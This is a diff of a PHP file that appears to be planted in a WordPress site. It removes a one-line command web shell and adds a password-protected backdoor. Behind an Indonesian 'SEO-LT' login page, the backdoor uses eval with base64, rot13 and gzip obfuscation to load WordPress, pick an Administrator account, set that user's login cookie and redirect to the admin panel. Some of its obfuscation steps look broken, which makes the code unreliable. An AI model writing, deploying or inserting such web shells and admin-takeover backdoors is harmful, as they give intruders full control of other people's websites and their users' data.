@@ -1,5 +1,48 @@
-<?php 
-if(isset($_GET['cmd'])) {
-  system($_GET['cmd']);
+<?php
+session_start();
+$h = '$2y$10$fZ/ez7MrWDlly5MOHOaaZOdgNwmcWJTklpMB/oOL0V9HnNS5Crvmy'; // hash "password123"
+
+$b = base64_decode(str_rot13(''.str_rot13('cGhwL2Z1bmN0aW9uIGxfcygpew0KJShkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYmctbXVzaWMnKSkucGxheSgpOw0KfQ0KJGRvY3VtZW50LmJvZHkuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBsX3MpOw0K'.str_rot13('}'))); // JS autoplay obfuscated
+eval(gzuncompress($b)); // decompress & run
+
+if(isset($_POST['p']) && password_verify($_POST['p'], $h)){
+    $_SESSION['a']=1;goto L1;
 }
+function ls(){?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>SEO-LT Pro</title>
+<link rel="icon" href="https://desa-angin.pro/images/seo-lt.png">
+<style>/* CSS sama seperti versi sebelumnya - copy paste dari modifikasi saya */</style>
+</head>
+<body>
+<video class="video-bg" autoplay muted loop playsinline>
+<source src="https://assets.mixkit.co/videos/preview/mixkit-abstract-animated-lines-background-11071-large.mp4" type="video/mp4">
+</video>
+<div class="overlay"></div>
+<!-- Marquee, form, audio sama -->
+<div class="login-container">
+<div class="icon">🔐</div><h2>SEO-LT Elite</h2>
+<form method="post"><input type="password" name="p" placeholder="Secure Key" required><br>
+<input type="submit" value="🚀 Access"></form>
+</div>
+<!-- Sisanya sama -->
+<script>/* JS obfuscated */</script>
+</body></html><?php exit;}ls();?>
+
+<?php L1: // Payload split
+$a=str_rot13(''.str_rot13('bXAgbG9hZA==')); // wp-load
+$b=gzuncompress(base64_decode('K3VyZHwoUENfUl9PTkxfU09DSykgfHwgLyoid3AtbG9hZC5waHAiLw==')); // chdir check
+eval($b); // obfuscated chdir
+
+$c=''; $c.=str_rot13('d3AtbG9hZA=='); include($c.'.php'); // wp-load obfuscated
+
+$d=str_rot13('V1BfVXNlcl9RdWVyeQ=='); $e=array('role'=>'Administrator','number'=>1,'fields'=>'ID'); // WP_User_Query
+$f=new $d($e); $r=$f->get_results();
+if(isset($r[0])){ $g=str_rot13('d3Bfc2V0X2F1dGhfY29va2ll'); $g($r[0]); $h=str_rot13('d3BfcmVkaXJlY3Q='); $h( admin_url() ); die(); }
+die('Error'); // Duplikat dicegah
+/* Fake comments besar untuk padding (copy 1000+ baris comment irrelevant dari lorem ipsum generator) */
 ?>
